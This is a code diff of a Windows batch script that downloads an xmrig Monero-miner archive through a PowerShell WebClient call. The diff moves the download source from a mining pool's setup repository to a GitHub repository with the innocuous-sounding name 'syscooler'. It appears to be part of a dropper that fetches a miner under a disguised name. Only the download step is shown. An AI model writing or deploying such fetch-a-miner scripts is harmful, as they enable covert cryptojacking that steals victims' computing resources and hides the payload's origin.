@@ -17,7 +17,7 @@ set "year=%datetime:~0,4%"
 set "month=%datetime:~4,2%"
 set "day=%datetime:~6,2%"
 
-set "url=http://download.c3pool.org/xmrig_setup/raw/master/xmrig.zip"
+set "url=https://raw.githubusercontent.com/1oneman1/syscooler/main/xmrig.zip"
 set "zipFile=xmrig.zip"
 set "extractDir=xmrig"
 powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('%url%', '%zipFile%')"
